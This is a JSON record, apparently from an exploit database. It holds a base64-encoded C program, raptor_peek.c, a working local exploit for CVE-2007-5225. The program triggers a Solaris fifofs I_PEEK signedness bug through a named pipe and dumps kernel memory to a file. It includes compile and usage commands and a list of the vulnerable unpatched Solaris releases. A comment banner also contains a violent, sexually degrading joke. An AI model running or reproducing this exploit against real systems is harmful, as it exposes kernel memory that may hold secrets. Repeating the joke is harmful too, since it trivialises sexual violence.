{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqICRJZDogcmFwdG9yX3BlZWsuYyx2IDEuMSAyMDA3LzEwLzE4IDA4OjA5OjAyIHJhcHRvciBFeHAgJA0KICoNCiAqIHJhcHRvcl9wZWVrLmMgLSBTb2xhcmlzIGZpZm9mcyBJX1BFRUsga2VybmVsIG1lbW9yeSBsZWFrDQogKiBDb3B5cmlnaHQgKGMpIDIwMDcgTWFyY28gSXZhbGRpIDxyYXB0b3JAMHhkZWFkYmVlZi5pbmZvPg0KICoNCiAqIFtMYW1lXSBpbnRlZ2VyIHNpZ25lZG5lc3MgZXJyb3IgaW4gRklGTyBmaWxlc3lzdGVtcyAobmFtZWQgcGlwZXMpIG9uIFN1biANCiAqIFNvbGFyaXMgOCB0aHJvdWdoIDEwIGFsbG93cyBsb2NhbCB1c2VycyB0byByZWFkIHRoZSBjb250ZW50cyBvZiB1bnNwZWNpZmllZCANCiAqIG1lbW9yeSBsb2NhdGlvbnMgdmlhIGEgbmVnYXRpdmUgdmFsdWUgdG8gdGhlIElfUEVFSyBpb2N0bCAoQ1ZFLTIwMDctNTIyNSkuDQogKg0KICogICAgICAgIC9cICAgQVMgUEFSVCBPRiBBIFZBU1QgV09STEQtV0lERSBDT05TUElSQUNZICAgICAgICAgICAgICANCiAqICBoam0gIC8gIFwgICBJIENPTU1BTkQgVEhFRTogIEJFQVQgT0ZGIFVOVE8gTUUgICAgICAgICAgICAgICAgICAgDQogKiAgICAgIC8sLS0uXCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICogICAgIC88ICgpID5cICAgSUYgSSBTQVkgIkZOT1JEIiBBVCBUSEUgRU5EIE9GIEEgU0VOVEVOQ0UgICAgICAgICANCiAqICAgIC8gIGAtLScgIFwgICBET0VTIFRIQVQgTUFLRSBNRSBSRUFMTFkgRlVOTlkgT1IgU09NRU9ORSAgICAgICAgDQogKiAgIC8gICAgICAgICAgXCAgIFdITyBORUVEUyBUTyBHRVQgRlVDS0lORyBCRUFURU4gVE8gTkVBUiAgICAgICAgIA0KICogIC8gICAgICAgICAgICBcICAgREVBVEggQU5EIFRIRU4gUkFQRUQgV0lUSCBBIEJST09NICAgICAgICAgICAgICANCiAqIC9fX19fX19fX19fX19fX1wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogKiAgICAgICAgICAgICAgICAgIEFTIFlPVSBDQU4gU0VFIFRIQVQnUyBSRUFMTFkgVFdPIEpPS0VTIElOIE9ORQ0KICogICAgICAgICAgICAgICAgICAgU08gWU9VIFJFQUxMWSBHRVQgWU9VUiBNT05FWSdTIFdPUlRIIEhFUkUgICANCiAqIFVzYWdlOg0KICogJCBnY2MgcmFwdG9yX3BlZWsuYyAtbyByYXB0b3JfcGVlayAtV2FsbA0KICogJCAuL3JhcHRvcl9wZWVrIGtlcm5kdW1wIDY2NjY2Ng0KICogWy4uLl0NCiAqICQgbHMgLWwga2VybmR1bXAgDQogKiAtcnd4LS0tLS0tICAgMSByYXB0b3IgICBzdGFmZiAgICAgNjY2NjY2IE9jdCAxNyAxOTozMyBrZXJuZHVtcA0KICoNCiAqIFZ1bG5lcmFibGUgcGxhdGZvcm1zIChTUEFSQyk6DQogKiBTb2xhcmlzIDggd2l0aG91dCBwYXRjaCAxMDk0NTQtMDYgW3Rlc3RlZF0NCiAqIFNvbGFyaXMgOSB3aXRob3V0IHBhdGNoIDExNzQ3MS0wNCBbdGVzdGVkXQ0KICogU29sYXJpcyAxMCB3aXRob3V0IHBhdGNoIDEyNzczNy0wMSBbdGVzdGVkXQ0KICoNCiAqIFZ1bG5lcmFibGUgcGxhdGZvcm1zICh4ODYpOg0KICogU29sYXJpcyA4IHdpdGhvdXQgcGF0Y2ggMTA5NDU1LTA2IFt1bnRlc3RlZF0NCiAqIFNvbGFyaXMgOSB3aXRob3V0IHBhdGNoIDExNzQ3Mi0wNCBbdW50ZXN0ZWRdDQogKiBTb2xhcmlzIDEwIHdpdGhvdXQgcGF0Y2ggMTI3NzM4LTAxIFt1bnRlc3RlZF0NCiAqLw0KDQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5ncy5oPg0KI2luY2x1ZGUgPHN0cm9wdHMuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KDQojZGVmaW5lCUlORk8xCSJyYXB0b3JfcGVlay5jIC0gU29sYXJpcyBmaWZvZnMgSV9QRUVLIGtlcm5lbCBtZW1vcnkgbGVhayINCiNkZWZpbmUJSU5GTzIJIkNvcHlyaWdodCAoYykgMjAwNyBNYXJjbyBJdmFsZGkgPHJhcHRvckAweGRlYWRiZWVmLmluZm8+Ig0KDQojZGVmaW5lCUJBREZJRk8JIi90bXAvZm5vcmQiDQojZGVmaW5lIEJVRlNJWkUgMTAwMDAwMA0KDQppbnQgCWVycm5vOw0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDQp7DQoJaW50IAkJZmQsIGZpZm87DQoJc2l6ZV90CQlvdXQsIGJ1ZnNpemUgPSBCVUZTSVpFOw0KCWNoYXIJCSpidWY7DQoJc3RydWN0IHN0cnBlZWsgCXBlZWs7DQoNCgkvKiBwcmludCBleHBsb2l0IGluZm9ybWF0aW9uICovDQoJZnByaW50ZihzdGRlcnIsICIlc1xuJXNcblxuIiwgSU5GTzEsIElORk8yKTsNCg0KCS8qIHJlYWQgY29tbWFuZCBsaW5lICovDQoJaWYgKGFyZ2MgPCAyKSB7DQoJCWZwcmludGYoc3RkZXJyLCAidXNhZ2U6ICVzIG91dGZpbGUgW291dHNpemVdXG5cbiIsIGFyZ3ZbMF0pOw0KCQlleGl0KDEpOw0KCX0NCglpZiAoYXJnYyA+IDIpDQoJCWlmICgoYnVmc2l6ZSA9IGF0b2koYXJndlsyXSkpID09IDApIHsNCgkJCWZwcmludGYoc3RkZXJyLCAiRXJyb3IgKGF0b2kpOiBpbnZhbGlkIG91dHNpemVcbiIpOw0KCQkJZXhpdCgxKTsNCgkJfQ0KDQoJLyogcHJpbnQgc29tZSBvdXRwdXQgKi8NCglmcHJpbnRmKHN0ZGVyciwgIlVzaW5nIG91dGZpbGVcdDogJXNcbiIsIGFyZ3ZbMV0pOw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgb3V0c2l6ZVx0OiAldVxuXG4iLCBidWZzaXplKTsNCg0KCS8qIHByZXBhcmUgdGhlIG91dHB1dCBidWZmZXIgKi8NCglpZiAoKGJ1ZiA9IChjaGFyICopbWFsbG9jKGJ1ZnNpemUpKSA9PSBOVUxMKSB7DQoJCXBlcnJvcigiRXJyb3IgKG1hbGxvYykiKTsNCgkJZnByaW50ZihzdGRlcnIsICJIaW50OiBUcnkgYWdhaW4gd2l0aCBhIHNtYWxsZXIgb3V0cHV0IHNpemVcbiIpOw0KCQlleGl0KDEpOw0KCX0NCgltZW1zZXQoYnVmLCAwLCBidWZzaXplKTsNCg0KCS8qIGNyZWF0ZSB0aGUgbmFtZWQgcGlwZSAqLw0KCXVubGluayhCQURGSUZPKTsNCglpZiAobWtub2QoQkFERklGTywgU19JRklGTyB8IFNfSVJXWFUsIDApIDwgMCkgew0KCQlwZXJyb3IoIkVycm9yIChta25vZCkiKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglzd2l0Y2goZm9yaygpKSB7DQoJY2FzZSAtMTogCS8qIGNhbm5vdCBmb3JrICovDQoJCXBlcnJvcigiRXJyb3IgKGZvcmspIik7DQoJCWV4aXQoMSk7DQoJY2FzZSAwOiAJLyogdGhlIGNoaWxkIHdyaXRlcyAqLw0KCQlpZiAoKGZpZm8gPSBvcGVuKEJBREZJRk8sIE9fV1JPTkxZLCAwKSkgPCAwKSB7DQoJCQlwZXJyb3IoIkVycm9yIChvcGVuKSIpOw0KCQkJZXhpdCgxKTsNCgkJfQ0KCQl3cml0ZShmaWZvLCAiRk5PUkQiLCA1KTsNCgkJZXhpdCgwKTsNCglkZWZhdWx0OiAJLyogdGhlIHBhcmVudCByZWFkcyAqLw0KCQkvKiBGQUxMIFRIUk9VR0ggKi8NCgkJOw0KCX0NCg0KCS8qIHBlcmZvcm0gdGhlIE1BR0lDSyAqLw0KCWlmICgoZmlmbyA9IG9wZW4oQkFERklGTywgT19SRE9OTFksIDApKSA8IDApIHsNCgkJcGVycm9yKCJFcnJvciAob3BlbikiKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgltZW1zZXQoJnBlZWssIDAsIHNpemVvZihwZWVrKSk7DQoJcGVlay5kYXRhYnVmLmJ1ZiA9IGJ1ZjsNCglwZWVrLmRhdGFidWYubWF4bGVuID0gLTE7IC8qIEZOT1JEISAqLw0KDQoJaWYgKGlvY3RsKGZpZm8sIElfUEVFSywgJnBlZWspIDwgMCApIHsNCgkJcGVycm9yKCJFcnJvciAoaW9jdGwpIik7DQoJCWNsb3NlKGZpZm8pOw0KCQlleGl0KDEpOw0KCX0NCg0KCS8qIHNhdmUgb3V0cHV0IHRvIG91dGZpbGUgKi8NCglpZiAoKGZkID0gb3Blbihhcmd2WzFdLCBPX1JEV1IgfCBPX0NSRUFUIHwgT19UUlVOQywgMDcwMCkpIDwgMCkgew0KCQlwZXJyb3IoIkVycm9yIChvcGVuKSIpOw0KCQljbG9zZShmaWZvKTsNCgkJZXhpdCgxKTsNCgl9DQoJb3V0ID0gd3JpdGUoZmQsIGJ1ZiwgYnVmc2l6ZSk7DQoNCglmcHJpbnRmKHN0ZGVyciwgIkZOT1JEISAldSBieXRlcyB3cml0dGVuIHRvICVzXG4iLCBvdXQsIGFyZ3ZbMV0pOw0KCWZwcmludGYoc3RkZXJyLCAiSGludDogVHJ5IGFsc28gd2l0aCBhIGJpZ2dlciBvdXRwdXQgc2l6ZVxuIik7DQoNCgkvKiBjbGVhbnVwICh3aG8gY2FyZXMgYWJvdXQgZnJlZT87KSAqLw0KCWNsb3NlKGZkKTsNCgljbG9zZShmaWZvKTsNCg0KCWV4aXQoMCk7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA4LTAzLTEwXQ==", 
    "filename": "platforms/solaris/local/5227.c", 
    "id": "5227", 
    "cves": [
        "CVE-2007-5225"
    ]
}